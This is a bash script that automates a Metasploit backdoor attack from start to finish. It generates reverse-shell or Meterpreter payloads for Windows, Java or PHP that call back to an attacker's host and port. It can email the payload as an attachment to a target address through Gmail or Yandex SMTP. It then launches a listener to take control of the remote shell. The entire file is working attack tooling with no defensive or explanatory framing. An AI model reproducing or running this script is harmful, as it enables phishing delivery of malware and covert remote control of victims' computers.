#!/bin/bash 
#Coded by : lawrencethepentester 
#Email : zeroattck@gmail.com 
#depends on your metasploit configuration 


echo "*************************************************"
echo " [+] Backdoor Generation  
       [~]Just Few Steps to Build it quickly 
       [+]Coder: zeroattck@gmail.com "
echo "-------------------------"
echo "*************************************************"
echo -n "what is your HOST IP address ? : " 
read -e LHOST 
echo "-------------------------"
echo "*************************************************"
echo -n "what is PORT would you like to use it EX:443 ? "
read -e PORT 
echo "-------------------------"
echo "*************************************************"
echo -n " type where you want to save your Backdoor ?"
read -e pa
echo "------------------"
echo "*************************************************"
echo  "choose  type of Backdoor: "
echo  "1. windows/meterpreter/reverse_tcp"
echo  "2. windows/reverse_shell_tcp" 
echo  "3. windows/meterpreter/X64 " 
echo  "4. Java Meterpreter reverse " 
echo  "5. PHP Meterpreter reverse "
read -e door 
echo "---------------------------" 
echo "*************************************************"
echo "---------Building Backdoor please wait ---------"
echo "*************************************************"
case "$door" in 
'1')
msfpayload windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$PORT x > $pa ;;
'2')
msfpayload windows/shell_reverse_tcp LHOST=$LHOST LPORT=$PORT x > $pa ;;
'3')
msfpayload windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$PORT x > $pa ;; 
'4')
msfpayload java/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$PORT x > $pa ;; 
'5') 
msfpayload php/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$PORT R > $pa ;; 
esac
echo "----------------Backdoor Successfully Build ---------------------"
echo  "Do You Want to send it by Email ..! ? " 
echo  "yes"
echo  "no" 
echo "..> "
read -e snd 
case "$snd" in 
'yes')
echo -n "type Your Email Address (sender Email) ?" 
read -e semail
echo ""
echo -n "type Target Email Address (reciever Email ) ?"
read -e remail 
echo ""
echo -n "write your body message ..>: " 
read -e body 
echo ""
echo -n "please !!! write a Subject ::" 
read -e subj
echo ""
echo  "choose SMTP server for Sending Email service " 
echo  "1. Gmail SMTP server"
echo  "2. Yandex SMTP Server " 
read -e smserver
echo -n " Enter YOUR smtp user name : "
read -e user
echo ""
echo -n " Enter YOUR smtp password  : " 
read -e pass
echo ""
echo ".......Sending in progress ......" 
case "$smserver" in 
'1') 
sendemail -f $semail -t $remail -m "$body" -u "$subj" -xu $user -xp $pass -s smtp.gmail.com:587 -a $pa;;
'2') 
sendemail -f $semail -t $remail -m "$body" -u "$subj" -xu $user -xp $pass -s smtp.yandex.com:587 -a $pa;;
esac 
esac
echo -n "do you want to lauch MSF Listening mod after creating Backoor if Yes leave it Blank? " 
read -e NOYES 
case "$door" in 
'1')
"$NOYES"msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$PORT E ;;
'2')
"$NOYES"msfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp LHOST=$LHOST LPORT=$PORT E ;;
'3') 
"$NOYES"msfcli exploit/multi/handler PAYLOAD=windows/x64/meterpreter/reverse_tcp  LHOST=$LHOST LPORT=$PORT E ;;
'4')
"$NOYES"msfcli exploit/multi/handler PAYLOAD=java/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$PORT E ;;
esac 

echo "**********************DONE***************************"


